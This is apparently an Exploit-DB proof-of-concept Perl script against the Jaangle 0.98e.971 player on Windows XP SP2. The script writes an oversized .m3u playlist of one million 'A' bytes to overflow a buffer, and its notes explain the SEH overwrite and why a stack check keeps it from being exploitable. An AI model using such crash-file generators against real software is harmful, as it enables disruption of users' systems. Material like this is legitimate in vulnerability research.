#!/usr/bin/perl
# jaangle 0.98e.971
# Author: s-dz        , s-dz@hotmail.fr
# Download : http://www.jaangle.com/files/jsetup.exe
# Tested : Windows XP SP2 (fr)
# DATE   : 2010-08-02
#
# thanks TCT , DGM8
#
# Exploit-DB Notes:
# 0012B448   00410041  A.A.  jaangle.00410041
# 0012B44C   00410041  A.A.  Pointer to next SEH record
# 0012B450   00410041  A.A.  SE handler
# 0012B454   00410041  A.A.  jaangle.00410041
# The overwrite is caused by a wsprintfW() function, however the program checks
# for a XOR'd DWORD at ESP+7D8 with DS:[601E60] (if not matched --> TerminateProcess).
# Having control over the SEH does not actually cause any exception between wsprintfW()
# to TerminateProcess().

my $file= "mahboul-3lik00.m3u";
my $junk= "\x41" x  1000000;

open($FILE, ">$file");
print($FILE $junk);
close($FILE);
print("exploit created successfully");